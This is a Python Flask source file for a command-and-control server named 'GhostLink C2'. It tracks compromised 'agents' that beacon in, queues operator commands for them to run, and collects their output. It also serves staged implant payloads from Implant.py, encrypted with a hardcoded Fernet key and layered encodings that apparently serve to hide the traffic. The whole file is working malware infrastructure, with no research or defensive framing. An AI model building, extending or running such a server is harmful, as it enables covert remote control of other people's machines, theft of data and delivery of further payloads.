from flask import Flask, request, jsonify
import sqlite3
import json
import os
from datetime import datetime
from cryptography.fernet import Fernet
import base64

app = Flask(__name__)
DB_PATH = "ghostlink.db"
# Generate proper Fernet key
ENCRYPTION_KEY = b"p-EVN8hYvMU8sH7pV0q6vF-YlK9pNxR5tQ2K8zM0GJQ="  # 44-char base64 encoded

# Database initialization
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS agents
                 (id INTEGER PRIMARY KEY, agent_id TEXT UNIQUE, 
                  hostname TEXT, ip_address TEXT, os TEXT, 
                  last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY, agent_id TEXT, command TEXT, 
                  status TEXT, timestamp TEXT, result TEXT)''')
    conn.commit()
    conn.close()
    print("[+] Database initialized: ghostlink.db")

def decrypt_data(encrypted_data):
    """Decrypt incoming data from agent with multi-layer support"""
    try:
        f = Fernet(ENCRYPTION_KEY)
        
        # Try multi-layer decoding (Hex → Base64 → Fernet)
        try:
            import base64
            from utils import EncodingSchemes
            
            # First try multi-layer (Hex → Base64 → Fernet)
            try:
                b64_decoded = EncodingSchemes.hex_decode(encrypted_data)
                encrypted = base64.b64decode(b64_decoded.encode())
                decrypted = f.decrypt(encrypted)
                return json.loads(decrypted.decode())
            except:
                # Fall back to simple base64 decoding
                encrypted = base64.b64decode(encrypted_data.encode())
                decrypted = f.decrypt(encrypted)
                return json.loads(decrypted.decode())
        except:
            # Final fallback to direct decryption
            decrypted = f.decrypt(encrypted_data.encode())
            return json.loads(decrypted.decode())
    except Exception as e:
        print(f"[-] Decryption error: {e}")
        return None

def encrypt_data(data):
    """Encrypt outgoing data to agent with multi-layer support"""
    try:
        import base64
        from utils import EncodingSchemes
        
        f = Fernet(ENCRYPTION_KEY)
        json_data = json.dumps(data)
        
        # Layer 1: Fernet encryption
        encrypted = f.encrypt(json_data.encode())
        
        # Layer 2: Multi-layer encoding (Base64 → Hex)
        b64_encoded = base64.b64encode(encrypted).decode()
        final = EncodingSchemes.hex_encode(b64_encoded)
        
        return final
    except Exception as e:
        print(f"[-] Encryption error: {e}")
        return None

def register_agent(agent_id, hostname, ip_address, os_type):
    """Register new agent in database"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    try:
        c.execute('''INSERT INTO agents (agent_id, hostname, ip_address, os, last_seen, status)
                     VALUES (?, ?, ?, ?, ?, ?)''',
                  (agent_id, hostname, ip_address, os_type, datetime.now().isoformat(), "active"))
        conn.commit()
        print(f"[+] Agent registered: {agent_id} from {ip_address}")
    except sqlite3.IntegrityError:
        # Agent already exists, update last_seen
        c.execute('''UPDATE agents SET last_seen = ?, status = ? WHERE agent_id = ?''',
                  (datetime.now().isoformat(), "active", agent_id))
        conn.commit()
    finally:
        conn.close()

def get_pending_commands(agent_id):
    """Get pending commands for agent"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''SELECT id, command FROM commands 
                 WHERE agent_id = ? AND status = 'pending' LIMIT 1''', (agent_id,))
    result = c.fetchone()
    conn.close()
    return result

def update_command_status(cmd_id, status, result=None):
    """Update command status"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''UPDATE commands SET status = ?, result = ? WHERE id = ?''',
              (status, result, cmd_id))
    conn.commit()
    conn.close()

@app.route('/beacon', methods=['POST'])
def beacon():
    """Agent beaconing endpoint"""
    try:
        encrypted_payload = request.json.get('payload')
        if not encrypted_payload:
            return jsonify({"error": "No payload"}), 400
        
        # Decrypt agent data
        agent_data = decrypt_data(encrypted_payload)
        if not agent_data:
            return jsonify({"error": "Decryption failed"}), 400
        
        agent_id = agent_data.get('agent_id')
        hostname = agent_data.get('hostname')
        ip_address = request.remote_addr
        os_type = agent_data.get('os')
        
        # Register/update agent
        register_agent(agent_id, hostname, ip_address, os_type)
        
        # Get pending commands
        cmd_result = get_pending_commands(agent_id)
        
        response = {
            "status": "ok",
            "agent_id": agent_id,
            "command": None
        }
        
        if cmd_result:
            cmd_id, command = cmd_result
            response["command"] = command
            response["cmd_id"] = cmd_id
        
        # Encrypt response
        encrypted_response = encrypt_data(response)
        
        return jsonify({"payload": encrypted_response}), 200
    
    except Exception as e:
        print(f"[-] Beacon error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/result', methods=['POST'])
def receive_result():
    """Receive command execution results from agent"""
    try:
        encrypted_payload = request.json.get('payload')
        result_data = decrypt_data(encrypted_payload)
        
        if not result_data:
            return jsonify({"error": "Decryption failed"}), 400
        
        cmd_id = result_data.get('cmd_id')
        output = result_data.get('output')
        agent_id = result_data.get('agent_id')
        
        # Update command with result
        update_command_status(cmd_id, "completed", output)
        
        print(f"[+] Result received from {agent_id}:\n{output}")
        
        return jsonify({"status": "received"}), 200
    
    except Exception as e:
        print(f"[-] Result receive error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/agents', methods=['GET'])
def list_agents():
    """List all connected agents"""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('SELECT agent_id, hostname, ip_address, os, last_seen, status FROM agents')
    agents = c.fetchall()
    conn.close()
    
    agent_list = [{"agent_id": a[0], "hostname": a[1], "ip": a[2], "os": a[3], 
                   "last_seen": a[4], "status": a[5]} for a in agents]
    
    print(f"\n[*] Active Agents: {len(agent_list)}")
    for agent in agent_list:
        print(f"    - {agent['agent_id']} ({agent['hostname']}) - {agent['ip']} [{agent['status']}]")
    
    return jsonify(agent_list), 200

@app.route('/stage2', methods=['POST'])
def stage2():
    """Serve second-stage payload (lightweight stager)"""
    try:
        data = request.json
        agent_id = data.get('agent_id', 'unknown')
        
        # Read the actual implant code
        with open('Implant.py', 'r') as f:
            implant_code = f.read()
        
        # Base64 encode for transmission
        encoded_payload = base64.b64encode(implant_code.encode()).decode()
        
        return jsonify({"payload": encoded_payload}), 200
    except Exception as e:
        print(f"[-] Stage2 error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/stage3', methods=['POST'])
def stage3():
    """Serve third-stage payload (full implant, encrypted)"""
    try:
        data = request.json
        agent_id = data.get('agent_id', 'unknown')
        session_id = data.get('session_id', 'unknown')
        
        # Read the full implant code
        with open('Implant.py', 'r') as f:
            implant_code = f.read()
        
        # Encrypt using Fernet
        f = Fernet(ENCRYPTION_KEY)
        encrypted_payload = f.encrypt(implant_code.encode()).decode()
        
        return jsonify({"payload": encrypted_payload}), 200
    except Exception as e:
        print(f"[-] Stage3 error: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/send_command', methods=['POST'])
def send_command():
    """Queue command for agent"""
    try:
        data = request.json
        agent_id = data.get('agent_id')
        command = data.get('command')
        
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        c.execute('''INSERT INTO commands (agent_id, command, status, timestamp)
                     VALUES (?, ?, ?, ?)''',
                  (agent_id, command, "pending", datetime.now().isoformat()))
        conn.commit()
        conn.close()
        
        print(f"[+] Command queued for {agent_id}: {command}")
        
        return jsonify({"status": "queued"}), 200
    
    except Exception as e:
        print(f"[-] Send command error: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    init_db()
    print("[*] GhostLink C2 Server Starting on 0.0.0.0:8888...")
    print("[*] Endpoints:")
    print("    - POST /beacon (Agent beaconing)")
    print("    - POST /result (Receive command results)")
    print("    - GET  /agents (List agents)")
    print("    - POST /send_command (Queue command)")
    app.run(host="0.0.0.0", port=8888, debug=False)